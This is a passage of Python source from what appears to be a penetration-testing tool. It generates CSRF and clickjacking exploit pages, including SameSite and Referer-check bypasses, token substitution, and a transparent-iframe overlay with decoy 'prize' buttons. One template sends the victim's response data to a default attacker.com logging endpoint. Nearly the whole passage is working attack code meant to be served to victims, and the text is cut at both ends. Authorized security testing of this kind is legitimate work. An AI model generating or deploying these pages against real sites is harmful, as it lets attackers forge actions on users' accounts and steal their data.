                console.log("Status:", xhr.status);
                console.log("Response:", xhr.responseText);
                if (xhr.status >= 200 && xhr.status < 300) {{
                    console.log("[!] CSRF request succeeded!");
                    var img = new Image();
                    img.src = "{attacker_server}/log?status=" + xhr.status
                              + "&data=" + encodeURIComponent(xhr.responseText);
                }}
            }}
        }};

        {send_block}
        console.log("CSRF XHR PoC loaded – target:", "{url}");
    </script>
</body>
</html>'''

    # ── Link ──────────────────────────────────────────────────────────────────

    @staticmethod
    def generate_csrf_link_poc(request_info: RequestInfo,
                                attacker_server: str = "https://attacker.com",
                                bypass: str = "None",
                                auto_submit: bool = False, **kwargs) -> str:
        """CSRF PoC triggered when the victim clicks a link."""
        if bypass == CSRFGenerator.BYPASS_NOT_TIED_TO_SESSION:
            return CSRFGenerator.generate_csrf_not_tied_to_session_poc(
                request_info, attacker_server, auto_submit=auto_submit, **kwargs)
        method, url, body = CSRFGenerator._apply_bypass(request_info, bypass)
        bypass_note = CSRFGenerator._bypass_note(bypass, request_info)

        auto_submit_script = (
            '\n    <script>\n        window.onload = function() '
            '{ document.getElementById("auto_link").click(); };\n    </script>'
            if auto_submit else ""
        )

        if method == "GET":
            return f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC – Link (GET)</title></head>
<body>
    <h3>CSRF Proof of Concept – Link</h3>
    <p>Target: <code>{url}</code></p>
    {bypass_note}
    <p>
        Trick the victim into clicking the link below (e.g. via social engineering,
        phishing email, or embedding on a page they visit).
    </p>

    <a id="auto_link" href="{url}" style="font-size:1.2em;">
        Click here for your prize! 🎁
    </a>{auto_submit_script}

    <script>console.log("CSRF Link PoC loaded (GET) – target:", "{url}");</script>
</body>
</html>'''

        # POST: clicking the link submits a hidden form via JS
        hidden_inputs = CSRFGenerator._hidden_inputs_from_body(body)
        auto_submit_script_post = (
            '\n    <script>\n        window.onload = function() '
            '{ document.getElementById("csrf_form").submit(); };\n    </script>'
            if auto_submit else ""
        )
        return f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC – Link (POST)</title></head>
<body>
    <h3>CSRF Proof of Concept – Link</h3>
    <p>Target: <code>{url}</code></p>
    {bypass_note}
    <p>
        Clicking the link below submits a hidden POST form to the target.
        Trick the victim into clicking it (social engineering / phishing).
    </p>

    <form action="{url}" method="POST" id="csrf_form" style="display:none">
{hidden_inputs}    </form>

    <a href="#" id="auto_link" onclick="document.getElementById('csrf_form').submit(); return false;"
       style="font-size:1.2em;">
        Click here for your prize! 🎁
    </a>{auto_submit_script_post}

    <script>console.log("CSRF Link PoC loaded (POST) – target:", "{url}");</script>
</body>
</html>'''

    # ── Not-tied-to-session bypass ─────────────────────────────────────────────

    @staticmethod
    def generate_csrf_not_tied_to_session_poc(
            request_info: RequestInfo,
            attacker_server: str = "https://attacker.com",
            attacker_token: str = "",
            auto_submit: bool = False) -> str:
        """CSRF PoC for the 'token not tied to user session' bypass.

        The application maintains a global pool of valid tokens — any token it
        has ever issued is accepted regardless of which session submits it.
        The attacker logs in with their own account, obtains their valid token,
        and uses it in a CSRF attack against a victim's session.

        This PoC simply substitutes the attacker's own valid token into the
        form body. No cookie injection is needed — the victim's session cookie
        is sent automatically by the browser, and the server accepts the
        attacker's token because it exists in the global pool.
        """
        url    = request_info.url
        method = request_info.method
        body   = request_info.body
        bypass_note = CSRFGenerator._bypass_note(
            CSRFGenerator.BYPASS_NOT_TIED_TO_SESSION, request_info)

        # Replace the csrf token in the body with the attacker's own valid token
        if attacker_token:
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    replaced = False
                    for k in list(data.keys()):
                        if CSRFGenerator._is_csrf_token_key(k):
                            data[k] = attacker_token
                            replaced = True
                    if not replaced:
                        data["csrf"] = attacker_token
                    body = json.dumps(data)
            except (json.JSONDecodeError, ValueError):
                try:
                    params = urllib.parse.parse_qsl(body, keep_blank_values=True)
                    new_params, replaced = [], False
                    for k, v in params:
                        if CSRFGenerator._is_csrf_token_key(k):
                            new_params.append((k, attacker_token))
                            replaced = True
                        else:
                            new_params.append((k, v))
                    if not replaced:
                        new_params.append(("csrf", attacker_token))
                    body = urllib.parse.urlencode(new_params)
                except Exception:
                    pass

        hidden_inputs = CSRFGenerator._hidden_inputs_from_body(body)

        placeholder_html = ""
        if not attacker_token:
            placeholder_html = (
                "<p style='color:orange;'>⚠️  Enter your own valid CSRF token "
                "(from your attacker account) in the field above.</p>")

        auto_submit_script = (
            '\n    <script>\n        document.getElementById("csrf_form").submit();\n    </script>'
            if auto_submit else ""
        )

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC – Token Not Tied to Session</title>
</head>
<body>
    <h3>CSRF Bypass – Token Not Tied to User Session</h3>
    {bypass_note}
    {placeholder_html}
    <p>Target: <code>{url}</code></p>
    <p>
        The server maintains a global pool of valid tokens — it does not verify
        that the token was issued to the session making the request.<br>
        This PoC uses the attacker's own valid token
        <code>{attacker_token or "YOUR-TOKEN"}</code>
        while the victim's session cookie is sent automatically by the browser.
    </p>

    <form action="{url}" method="{method}" id="csrf_form" style="display:none">
{hidden_inputs}
        <input type="submit" value="Submit">
    </form>{auto_submit_script}

    <script>
        console.log("Not-tied-to-session bypass PoC loaded");
        console.log("Target:", "{url}");
        console.log("Attacker token used:", "{attacker_token or 'NOT SET'}");
    </script>
</body>
</html>'''

    @staticmethod
    def generate_csrf_referer_circumvent_poc(
            request_info: RequestInfo,
            auto_submit: bool = False,
            new_tab: bool = True,
            attacker_server: str = "https://attacker.com",
            bypass: str = "None", **kwargs) -> str:
        """Referer bypass: place the victim domain in the exploit URL query string.

        Uses history.pushState() to set the exploit page's URL to
        /?<target-host> so the browser's Referer for the CSRF request contains
        the target domain, satisfying naive 'contains' checks.
        The Referrer-Policy: unsafe-url header is embedded in a <meta> tag and
        noted in the HTML so the tester knows to also set it as a response header
        on their exploit server.
        """
        method, url, body = CSRFGenerator._apply_bypass(request_info, bypass)
        target_attr = 'target="_blank"' if new_tab else ''
        auto_submit_script = (
            '\n    <script>\n        document.getElementById("csrf_form").submit();\n    </script>'
            if auto_submit else ""
        )
        hidden_inputs = CSRFGenerator._hidden_inputs_from_body(body)
        target_host   = request_info.host or urllib.parse.urlparse(url).netloc

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC \u2013 Referer Bypass (Query String)</title>
    <!-- Ensure the full URL including query string is sent in the Referer header.
         You MUST also serve this page with the HTTP response header:
             Referrer-Policy: unsafe-url
         without it many browsers will strip the query string from the Referer. -->
    <meta name="referrer" content="unsafe-url">
</head>
<body>
    <h3>CSRF Proof of Concept \u2013 Referer Bypass (Query String Trick)</h3>
    <p>
        The server validates that the <code>Referer</code> header contains its own
        domain name somewhere in the string. This PoC uses
        <code>history.pushState()</code> to append the target domain
        (<code>{target_host}</code>) to the exploit page\u2019s URL as a query
        parameter. The browser then includes the full URL (including the query
        string) in the <code>Referer</code> header when the form submits.
    </p>
    <p style="color:#e67e22;">
        \u26a0\ufe0f  <strong>Important:</strong> serve this page with the HTTP response header<br>
        <code>Referrer-Policy: unsafe-url</code><br>
        so the browser does not strip the query string from the Referer.
    </p>
    <p>Target: <code>{url}</code></p>
    <p>Attacker server: <code>{attacker_server}</code></p>

    <form action="{url}" method="POST" id="csrf_form" {target_attr}>
{hidden_inputs}
        <input type="submit" value="Submit CSRF Request">
    </form>

    <script>
        // Rewrite the exploit page URL so its query string contains the target domain.
        // The browser will include this full URL in the Referer header on submit.
        history.pushState("", "", "/?{target_host}");
        console.log("CSRF Referer-bypass PoC loaded");
        console.log("Exploit URL is now: " + window.location.href);
        console.log("Referer sent with CSRF request will contain: {target_host}");
    </script>{auto_submit_script}
</body>
</html>'''

    @staticmethod
    def generate_samesite_lax_referer_circumvent_poc(
            request_info: RequestInfo,
            token_bypass: str = "None") -> str:
        """Combined: SameSite Lax GET override + Referer circumvent (query string trick).

        Uses history.pushState() to place the target domain in the exploit page's
        URL query string so the Referer header satisfies naive 'contains' checks,
        then redirects via top-level GET navigation (_method=POST) so SameSite=Lax
        cookies are still sent by the browser.

        Requires the exploit server to send:  Referrer-Policy: unsafe-url
        """
        base_url = request_info.url
        if "?" in base_url:
            base_url = base_url.split("?", 1)[0]

        params: List[Tuple[str, str]] = []
        for key, vals in request_info.params.items():
            for v in vals:
                params.append((key, v))

        strip_token = token_bypass in (
            "Token validation \u2013 Token absent",
            "Token validation \u2013 Request method",
        )

        body = request_info.body.strip()
        if body:
            try:
                json_data = json.loads(body)
                if isinstance(json_data, dict):
                    for key, val in json_data.items():
                        if strip_token and CSRFGenerator._is_csrf_token_key(key):
                            continue
                        params.append((key, str(val)))
            except (json.JSONDecodeError, ValueError):
                for pair in body.split("&"):
                    if "=" in pair:
                        key, _, val = pair.partition("=")
                        key = urllib.parse.unquote_plus(key)
                        val = urllib.parse.unquote_plus(val)
                        if strip_token and CSRFGenerator._is_csrf_token_key(key):
                            continue
                        params.append((key, val))

        params.append(("_method", "POST"))
        query    = urllib.parse.urlencode(params)
        full_url = f"{base_url}?{query}" if query else base_url

        target_host = request_info.host or urllib.parse.urlparse(request_info.url).netloc

        token_bypass_note = ""
        if strip_token:
            token_bypass_note = (
                f"<p><em>Token Bypass applied: <strong>{token_bypass}</strong> \u2014 "
                f"CSRF token parameter removed from the request.</em></p>"
            )

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC \u2013 SameSite Lax + Referer Bypass</title>
    <!-- Ensures the full URL (including query string) is sent in the Referer header.
         You MUST also serve this page with the HTTP response header:
             Referrer-Policy: unsafe-url
         without it many browsers strip the query string from Referer. -->
    <meta name="referrer" content="unsafe-url">
</head>
<body>
    <h3>CSRF PoC \u2013 SameSite Lax (GET Override) + Referer Bypass (Query String)</h3>
    <p>
        Combines two bypass techniques:<br>
        <strong>1. SameSite Lax bypass:</strong> redirects via top-level GET navigation
        with <code>_method=POST</code> so SameSite=Lax session cookies are sent
        by the browser.<br>
        <strong>2. Referer circumvent:</strong> uses <code>history.pushState()</code>
        to place the target domain (<code>{target_host}</code>) in this page\u2019s URL
        query string so the browser\u2019s Referer satisfies naive substring checks.
    </p>
    <p style="color:#e67e22;">
        \u26a0\ufe0f  <strong>Important:</strong> serve this exploit page with the
        HTTP response header:<br>
        <code>Referrer-Policy: unsafe-url</code><br>
        Without it many browsers strip the query string from the Referer header.
    </p>
    {token_bypass_note}
    <p>Target: <code>{full_url}</code></p>
    <script>
        // Step 1: rewrite this page\u2019s URL so its query string contains the target domain.
        // The browser Referer for the navigation below will be this modified URL.
        history.pushState("", "", "/?{target_host}");

        // Step 2: top-level GET navigation \u2014 SameSite=Lax cookies are sent by the browser.
        document.location = "{full_url}";
    </script>
</body>
</html>'''

    @staticmethod
    def generate_samesite_strict_redirect_poc(redirect_url: str) -> str:
        """SameSite Strict bypass via client-side redirect gadget.

        Works against SameSite=Strict cookies because the attack exploits a
        redirect gadget that already lives on the target origin.  The attacker
        page performs a top-level document.location navigation to a target-site
        URL (e.g. a confirmation / open-redirect endpoint) that in turn redirects
        the victim to the sensitive action.  The second hop is a same-origin
        navigation, so the browser attaches SameSite=Strict session cookies.

        Args:
            redirect_url: Full URL of the target-site gadget that triggers the
                          redirect to the CSRF action (e.g. a path-traversal in
                          a confirmation page).
        """
        display_url = redirect_url or "https://TARGET/redirect?param=CSRF_ACTION"
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC – SameSite Strict Bypass (Client-side Redirect)</title>
</head>
<body>
    <h3>SameSite Strict Bypass – Client-side Redirect</h3>
    <p>
        The server sets cookies with <code>SameSite=Strict</code>, which normally
        prevents cookies from being sent on any cross-site request.  However, this
        target exposes a redirect <em>gadget</em> on its own origin.  When the
        victim visits this page:
    </p>
    <ol>
        <li>Their browser is redirected (via <code>document.location</code>) to the
            gadget URL on the target site — a cross-site top-level navigation
            (no cookies on this first hop).</li>
        <li>The gadget issues a <strong>same-origin redirect</strong> to the
            sensitive action URL.  Because this second navigation is
            <em>same-site</em>, the browser attaches the
            <code>SameSite=Strict</code> session cookie automatically.</li>
    </ol>
    <p>Gadget URL: <code>{display_url}</code></p>
    <script>
        document.location = "{display_url}";
    </script>
</body>
</html>'''

    @staticmethod
    def generate_samesite_lax_get_poc(request_info: RequestInfo,
                                        token_bypass: str = "None") -> str:
        """SameSite Lax bypass: redirect to a GET request with _method=POST override.

        GET requests triggered by top-level navigation still carry SameSite=Lax
        cookies.  By moving all body parameters into the query string and appending
        _method=POST the server-side framework routes the request as POST while the
        browser sends the session cookie automatically.

        If token_bypass is set the CSRF token is pre-processed before building the URL:
          - 'Token validation – Token absent': token param is removed entirely
          - 'Token validation – Request method': token param is also removed (redundant
            but consistent — switching to GET already renders the token validation moot)
        """
        # Strip any query string from the URL to rebuild cleanly
        base_url = request_info.url
        if "?" in base_url:
            base_url = base_url.split("?", 1)[0]

        params: List[Tuple[str, str]] = []

        # Preserve original query params
        for key, vals in request_info.params.items():
            for v in vals:
                params.append((key, v))

        # Decide whether to strip the CSRF token based on the token bypass
        strip_token = token_bypass in (
            "Token validation – Token absent",
            "Token validation – Request method",
        )

        # Move body params into query string
        body = request_info.body.strip()
        if body:
            try:
                json_data = json.loads(body)
                if isinstance(json_data, dict):
                    for key, val in json_data.items():
                        if strip_token and CSRFGenerator._is_csrf_token_key(key):
                            continue
                        params.append((key, str(val)))
            except (json.JSONDecodeError, ValueError):
                for pair in body.split("&"):
                    if "=" in pair:
                        key, _, val = pair.partition("=")
                        key = urllib.parse.unquote_plus(key)
                        val = urllib.parse.unquote_plus(val)
                        if strip_token and CSRFGenerator._is_csrf_token_key(key):
                            continue  # drop the token param
                        params.append((key, val))

        # Append the method-override parameter
        params.append(("_method", "POST"))

        query    = urllib.parse.urlencode(params)
        full_url = f"{base_url}?{query}" if query else base_url

        token_bypass_note = ""
        if strip_token:
            token_bypass_note = (
                f"<p><em>Token Bypass applied: <strong>{token_bypass}</strong> — "
                f"CSRF token parameter removed from the request.</em></p>"
            )

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC – SameSite Lax GET Override</title>
</head>
<body>
    <h3>SameSite Lax Bypass – GET Request with _method=POST Override</h3>
    <p>
        The server uses <code>SameSite=Lax</code> cookies, which block cross-site
        POST requests but still allow GET requests triggered by top-level navigation.
        All original body parameters have been moved into the query string and
        <code>_method=POST</code> is appended so server-side frameworks
        (e.g. Symfony, Laravel, Rails) route the request as POST internally.
    </p>
    {token_bypass_note}
    <p>Target: <code>{full_url}</code></p>
    <script>
        document.location = "{full_url}";
    </script>
</body>
</html>'''


# ─────────────────────────────────────────────────────────────────────────────
# Clickjacking PoC Generator
# ─────────────────────────────────────────────────────────────────────────────

class ClickjackingPoCGenerator:
    """Generates Clickjacking Proof-of-Concept HTML pages.

    The generated page loads the target URL in a transparent iframe and
    overlays a decoy button.  A built-in test-mode toolbar lets the tester:
      • toggle the iframe opacity (so you can see both layers for alignment)
      • nudge the iframe X/Y position with number inputs or arrow keys
      • copy a clean "attack mode" version (opacity 0, no toolbar) to clipboard
    """

    # ── Decoy button style presets ──────────────────────────────────────────

    DECOY_STYLES = {
        "Prize / Win":        ("background:#f39c12;color:#fff;border:2px solid #e67e22;", "🎁 Claim your prize!"),
        "Confirm / OK":       ("background:#27ae60;color:#fff;border:2px solid #219a52;", "✔ Confirm"),
        "Login / Sign In":    ("background:#2980b9;color:#fff;border:2px solid #2471a3;", "Sign In"),
        "Danger / Red":       ("background:#e74c3c;color:#fff;border:2px solid #c0392b;", "Delete"),
        "Download":           ("background:#8e44ad;color:#fff;border:2px solid #7d3c98;", "⬇ Download Now"),
        "Neutral / Grey":     ("background:#7f8c8d;color:#fff;border:2px solid #6c7a7d;", "Continue"),
    }

    # ── Element parser ──────────────────────────────────────────────────────

    @staticmethod
    def parse_element(element_html: str) -> dict:
        """Extract tag, text, and a best-effort CSS selector from an HTML snippet."""
        info = {"tag": "button", "text": "Submit", "selector": "button", "id": "", "classes": ""}
        if not element_html.strip():
            return info

        tag_m = re.match(r'<(\w+)', element_html.strip())
        info["tag"] = tag_m.group(1).lower() if tag_m else "button"

        id_m = re.search(r'\bid=["\']([^"\']+)["\']', element_html)
        if id_m:
            info["id"] = id_m.group(1)

        cls_m = re.search(r'\bclass=["\']([^"\']+)["\']', element_html)
        if cls_m:
            info["classes"] = cls_m.group(1)

        text_m = re.search(r'>([^<]+)</', element_html)
        if text_m:
            info["text"] = text_m.group(1).strip()

        # Build a CSS selector (id > first class > bare tag)
        if info["id"]:
            info["selector"] = f"#{info['id']}"
        elif info["classes"]:
            first_cls = info["classes"].split()[0]
            info["selector"] = f"{info['tag']}.{first_cls}"
        else:
            info["selector"] = info["tag"]

        return info

    # ── PoC generator ───────────────────────────────────────────────────────

    @staticmethod
    def generate_test_mode(
        target_url: str,
        target_element: str = "",
        decoy_text: str = "🎁 Claim your prize!",
        decoy_css: str = "background:#f39c12;color:#fff;border:2px solid #e67e22;",
        iframe_x_offset: int = 0,
        iframe_y_offset: int = 0,
        iframe_width: int = 1280,
        iframe_height: int = 800,
        decoy_x: int = 200,
        decoy_y: int = 200,
        decoy_x2: int = 400,
        decoy_y2: int = 400,
        decoy_width: int = 0,
        decoy_height: int = 0,
        decoy_font_size: int = 16,
        sandbox_attr: str = "",
        multistep: bool = False,
        decoy_text2: str = "Click me next",
        callback_port: Optional[int] = None,
    ) -> str:
        """Return the test-mode alignment page (visible iframe + toolbar).

        Open this in a browser to visually position the decoy button over the
        target element.  When callback_port is provided, a '✅ Send to PoC Tool'
        button POSTs the final offsets back to HUNT, which auto-updates the
        clean attack-mode PoC in the main UI.
        """

        if not target_url:
            target_url = "https://target.com/"

        elem      = ClickjackingPoCGenerator.parse_element(target_element)
        selector  = elem["selector"]
        elem_text = elem["text"]

        # sandbox_attr is passed in as-is (e.g. 'sandbox="allow-scripts allow-forms"')

        # Escape for JS template literal usage
        safe_url     = target_url.replace('`', '\\`').replace('${', '\\${')
        safe_decoy   = decoy_text.replace('`', '\\`').replace('${', '\\${')
        safe_decoy2  = decoy_text2.replace('`', '\\`').replace('${', '\\${')
        safe_css     = decoy_css.replace('`', '\\`').replace('${', '\\${')
        safe_sandbox = sandbox_attr.replace('`', '\\`').replace('${', '\\${')

        # ── Optional "Send to PoC Tool" button + JS function ────────────────
        _send_btn = ""
        _send_fn  = ""
        if callback_port:
            _send_btn = (
                '        <div class="toolbar-sep"></div>\n'
                '        <button class="send-btn" onclick="sendToTool()">&#x2705; Send to PoC Tool</button>\n'
                '        <p style="color:#50fa7b;font-size:9px;margin:2px 0 0 0;">'
                'Sends offsets to HUNT &amp; auto-updates&nbsp;the&nbsp;PoC.</p>\n'
            )
            _send_fn = f"""
    // ── Send offsets to PoC Tool ──────────────────────────────────────────
    async function sendToTool() {{
        var xOff   = parseInt(document.getElementById("x-offset").value) || 0;
        var yOff   = parseInt(document.getElementById("y-offset").value) || 0;
        var dbx    = parseInt(document.getElementById("dbx").value)   || 0;
        var dby    = parseInt(document.getElementById("dby").value)   || 0;
        var dbx2El = document.getElementById("dbx2");
        var dby2El = document.getElementById("dby2");
        var dbx2   = dbx2El ? (parseInt(dbx2El.value) || 0) : 0;
        var dby2   = dby2El ? (parseInt(dby2El.value) || 0) : 0;
        var btnW = parseInt(document.getElementById("btn-w").value)   || 0;
        var btnH = parseInt(document.getElementById("btn-h").value)   || 0;
        var btnFs= parseInt(document.getElementById("btn-fs").value)  || 16;
        var frW  = parseInt(document.getElementById("fr-w").value)    || 1280;
        var frH  = parseInt(document.getElementById("fr-h").value)    || 800;
        var btn  = document.querySelector('.send-btn');
        btn.disabled = true;
        try {{
            var r = await fetch('http://127.0.0.1:{callback_port}/update', {{
                method:  'POST',
                headers: {{'Content-Type': 'application/json'}},
                body:    JSON.stringify({{xOff: xOff, yOff: yOff, dbx: dbx, dby: dby, dbx2: dbx2, dby2: dby2, btnW: btnW, btnH: btnH, btnFs: btnFs, frW: frW, frH: frH}})
            }});
            if (r.ok) {{
                btn.textContent = '\\u2705 Sent! PoC updated in HUNT.';
                btn.style.background = '#27ae60';
            }} else {{
                btn.disabled = false;
                alert('Server returned an error. Try again.');
            }}
        }} catch(e) {{
            btn.disabled = false;
            alert('\\u274c Could not reach PoC Tool server.\\nMake sure HUNT is still open.\\nError: ' + e);
        }}
    }}
"""

        # Initial size style applied to the decoy button on first render
        decoy_size_style = ""
        if decoy_width > 0:
            decoy_size_style += f"width:{decoy_width}px;"
        if decoy_height > 0:
            decoy_size_style += f"height:{decoy_height}px;"
        decoy_size_style += f"font-size:{decoy_font_size}px;"

        # ── Multistep toolbar section (injected only when multistep=True) ──
        _ms_toolbar = ""
        if multistep:
            _ms_toolbar = (
                '        <div class="toolbar-sep"></div>\n'
                f'        <b style="color:#ff79c6;">2nd click position (px)</b>\n'
                f'        <label>X2 <input type="number" id="dbx2" value="{decoy_x2}"> px from left</label>\n'
                f'        <label>Y2 <input type="number" id="dby2" value="{decoy_y2}"> px from top</label>\n'
            )

        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Clickjacking PoC — Alignment</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        html {{ width: 100%; height: 100%; overflow: hidden; background: #fff; }}
        body {{ width: 100%; height: 100%; overflow: hidden; background: #fff; position: relative; }}

        /* ══ TARGET PAGE (transparent iframe — victim clicks land here) ══ */
        #target-frame {{
            position: relative;
            top:  {iframe_y_offset}px;
            left: {iframe_x_offset}px;
            width:  {iframe_width}px;
            height: {iframe_height}px;
            border: none;
            opacity: 0.5;
            z-index: 2;
        }}

        /* ══ DECOY LAYER (what the victim sees) ══ */
        #decoy-layer {{
            position: absolute;
            top: {decoy_y}px;
            left: {decoy_x}px;
            z-index: 1;
            font-size: 16px;
            padding: 12px 28px;
            border-radius: 6px;
            font-family: sans-serif;
            font-weight: bold;
            cursor: pointer;
            {decoy_css}
        }}
        #decoy-layer2 {{
            position: absolute;
            top: {decoy_y2}px;
            left: {decoy_x2}px;
            z-index: 1;
            font-size: 16px;
            padding: 12px 28px;
            border-radius: 6px;
            font-family: sans-serif;
            font-weight: bold;
            cursor: pointer;
            {decoy_css}
            display: {'block' if multistep else 'none'};
        }}

        /* ══ TEST-MODE TOOLBAR ══ */
        #poc-toolbar {{
            position: fixed;
            top: 10px; right: 10px;
            z-index: 9999;
            background: rgba(20,20,20,0.90);
            color: #f8f8f2;
            padding: 10px 12px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 11px;
            display: flex;
            flex-direction: column;
            gap: 6px;
            min-width: 200px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }}
        #poc-toolbar b {{ color: #ff79c6; font-size: 12px; }}
        #poc-toolbar label {{ display: flex; align-items: center; gap: 6px; cursor: pointer; }}
        #poc-toolbar input[type=range] {{ flex: 1; cursor: pointer; accent-color: #bd93f9; }}
        #poc-toolbar input[type=number] {{
            width: 60px; background: #44475a; color: #f8f8f2;
            border: 1px solid #6272a4; border-radius: 3px; padding: 2px 4px;
        }}
        .toolbar-sep {{ border-top: 1px solid #44475a; margin: 2px 0; }}
        .atk-btn {{
            background: #ff5555; color: #fff; border: none;
            border-radius: 4px; padding: 5px 8px;
            cursor: pointer; font-weight: bold; font-size: 11px;
        }}
        .atk-btn:hover {{ background: #ff6e6e; }}
        .send-btn {{
            background: #27ae60; color: #fff; border: none;
            border-radius: 4px; padding: 5px 8px;
            cursor: pointer; font-weight: bold; font-size: 11px;
        }}
        .send-btn:hover {{ background: #2ecc71; }}
        .send-btn:disabled {{ background: #555; cursor: default; }}
        #decoy-pos-note {{ color: #8be9fd; font-size: 10px; line-height: 1.4; }}
    </style>
</head>
<body>

    <!-- ══ DECOY LAYER — attacker-controlled visible content ══ -->
    <div id="decoy-layer">
        {decoy_text}
    </div>
    <div id="decoy-layer2">
        {decoy_text2}
    </div>

    <!-- ══ TARGET PAGE ══
         📝 element targeted → {selector}  ("{elem_text}") -->
    <iframe id="target-frame"
            src="{target_url}"
            {sandbox_attr}></iframe>

    <!-- ══ TEST-MODE TOOLBAR ══ -->
    <div id="poc-toolbar">
        <b>🎯 Alignment Mode</b>
        <div class="toolbar-sep"></div>

        <label>
            <input type="checkbox" id="show-frame" checked>
            Show iframe
        </label>
        <label>
            Opacity&nbsp;
            <input type="range" id="opacity-slider"
                   min="0" max="1" step="0.05" value="0.50">
            <span id="opacity-val">50%</span>
        </label>

        <div class="toolbar-sep"></div>
        <b style="color:#8be9fd;">Iframe position (px)</b>
        <label>X offset <input type="number" id="x-offset" value="{iframe_x_offset}"></label>
        <label>Y offset <input type="number" id="y-offset" value="{iframe_y_offset}"></label>

        <div class="toolbar-sep"></div>
        <b style="color:#8be9fd;">Iframe size (px)</b>
        <label>Width&nbsp; <input type="number" id="fr-w" value="{iframe_width}" min="100" style="width:65px;"></label>
        <label>Height <input type="number" id="fr-h" value="{iframe_height}" min="100" style="width:65px;"></label>
        <div id="decoy-pos-note">
            ← Use ↑ ↓ ← → arrow keys to nudge.<br>
            Shift+arrow = 10 px step.
        </div>

        <div class="toolbar-sep"></div>
        <b style="color:#50fa7b;">Decoy button position (px)</b>
        <label>Decoy X <input type="number" id="dbx" value="{decoy_x}"> px from left</label>
        <label>Decoy Y <input type="number" id="dby" value="{decoy_y}"> px from top</label>
{_ms_toolbar}

        <div class="toolbar-sep"></div>
        <b style="color:#ffb86c;">Decoy button size (px)</b>
        <label>Width&nbsp; <input type="number" id="btn-w" value="{decoy_width}" min="0" style="width:55px;"></label>
        <label>Height <input type="number" id="btn-h" value="{decoy_height}" min="0" style="width:55px;"></label>
        <label>Font&nbsp;&nbsp; <input type="number" id="btn-fs" value="16" min="6" max="120" style="width:55px;"> px</label>
        <div style="color:#6272a4;font-size:9px;line-height:1.3;">0 = auto (CSS padding drives size)</div>

        <div class="toolbar-sep"></div>
        <button class="atk-btn" onclick="copyAttackMode()">📋 Copy attack-mode HTML</button>
{_send_btn}    </div>

    <script>
    (function() {{
        var frame  = document.getElementById("target-frame");
        var slider = document.getElementById("opacity-slider");
        var opVal  = document.getElementById("opacity-val");
        var cbShow = document.getElementById("show-frame");
        var xIn    = document.getElementById("x-offset");
        var yIn    = document.getElementById("y-offset");
        var dbxIn  = document.getElementById("dbx");
        var dbyIn  = document.getElementById("dby");
        var dbx2In = document.getElementById("dbx2");
        var dby2In = document.getElementById("dby2");
        var frWIn  = document.getElementById("fr-w");
        var frHIn  = document.getElementById("fr-h");
        var decoyLayer  = document.getElementById("decoy-layer");
        var decoyLayer2 = document.getElementById("decoy-layer2");

        // ── Iframe size ───────────────────────────────────────────────────
        function applyFrameSize() {{
            frame.style.width  = (parseInt(frWIn.value) || 1280) + "px";
            frame.style.height = (parseInt(frHIn.value) || 800)  + "px";
        }}
        frWIn.addEventListener("input", applyFrameSize);
        frHIn.addEventListener("input", applyFrameSize);

        // ── Opacity controls ──────────────────────────────────────────────
        function syncOpacity() {{
            frame.style.opacity = cbShow.checked ? slider.value : "0";
            opVal.textContent   = Math.round(slider.value * 100) + "%";
        }}
        cbShow.addEventListener("change", syncOpacity);
        slider.addEventListener("input",  syncOpacity);
        syncOpacity();

        // ── Iframe X/Y offset ─────────────────────────────────────────────
        function applyFrameOffset() {{
            frame.style.left = (parseInt(xIn.value) || 0) + "px";
            frame.style.top  = (parseInt(yIn.value) || 0) + "px";
        }}
        xIn.addEventListener("input", applyFrameOffset);
        yIn.addEventListener("input", applyFrameOffset);

        // ── Decoy button position ─────────────────────────────────────────
        function applyDecoyPos() {{
            var x = parseInt(dbxIn.value) || 0;
            var y = parseInt(dbyIn.value) || 0;
            decoyLayer.style.left = x + "px";
            decoyLayer.style.top  = y + "px";
            if (dbx2In && dby2In && decoyLayer2) {{
                var x2 = parseInt(dbx2In.value) || 0;
                var y2 = parseInt(dby2In.value) || 0;
                decoyLayer2.style.left = x2 + "px";
                decoyLayer2.style.top  = y2 + "px";
            }}
        }}
        if (dbx2In) {{ dbx2In.addEventListener("input", applyDecoyPos); }}
        if (dby2In) {{ dby2In.addEventListener("input", applyDecoyPos); }}
        dbxIn.addEventListener("input", applyDecoyPos);
        dbyIn.addEventListener("input", applyDecoyPos);

        // ── Decoy button size ─────────────────────────────────────────────
        var btnWIn  = document.getElementById("btn-w");
        var btnHIn  = document.getElementById("btn-h");
        var btnFsIn = document.getElementById("btn-fs");

        function applyDecoySize() {{
            var w  = parseInt(btnWIn.value)  || 0;
            var h  = parseInt(btnHIn.value)  || 0;
            var fs = parseInt(btnFsIn.value) || 16;
            decoyLayer.style.width    = w > 0 ? w + "px" : "";
            decoyLayer.style.height   = h > 0 ? h + "px" : "";
            decoyLayer.style.fontSize = fs + "px";
            if (decoyLayer2) {{
                decoyLayer2.style.width    = w > 0 ? w + "px" : "";
                decoyLayer2.style.height   = h > 0 ? h + "px" : "";
                decoyLayer2.style.fontSize = fs + "px";
            }}
        }}
        btnWIn.addEventListener("input",  applyDecoySize);
        btnHIn.addEventListener("input",  applyDecoySize);
        btnFsIn.addEventListener("input", applyDecoySize);
        applyDecoySize();

        // ── Arrow-key fine-tuning of iframe position ──────────────────────
        document.addEventListener("keydown", function(e) {{
            var step = e.shiftKey ? 10 : 1;
            var tag  = (e.target.tagName || "").toUpperCase();
            if (tag === "INPUT") return;   // don't hijack number inputs
            if (e.key === "ArrowLeft")  {{ xIn.value = (parseInt(xIn.value)||0) - step; applyFrameOffset(); e.preventDefault(); }}
            if (e.key === "ArrowRight") {{ xIn.value = (parseInt(xIn.value)||0) + step; applyFrameOffset(); e.preventDefault(); }}
            if (e.key === "ArrowUp")    {{ yIn.value = (parseInt(yIn.value)||0) - step; applyFrameOffset(); e.preventDefault(); }}
